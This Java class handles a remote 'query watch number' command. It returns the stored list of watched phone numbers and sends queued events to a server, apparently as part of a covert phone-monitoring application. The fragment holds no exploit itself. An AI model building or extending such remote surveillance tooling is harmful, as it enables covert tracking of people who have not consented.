package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;

public class PCCQueryWatchNumb extends PCCRmtCmdSync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.QUERY_WATCH_NUMBER.getId());
		try {
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.WATCH_NUMBER);
			int countWatchNumDatabase = prefWatchListInfo.countWatchNumber();
			for (int i = 0; i < countWatchNumDatabase; i++) {
				responseMessage.append(Constant.CRLF);
				responseMessage.append(prefWatchListInfo.getWatchNumber(i));
			}
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());		
		// To send events
		eventSender.sendEvents();
	}
}
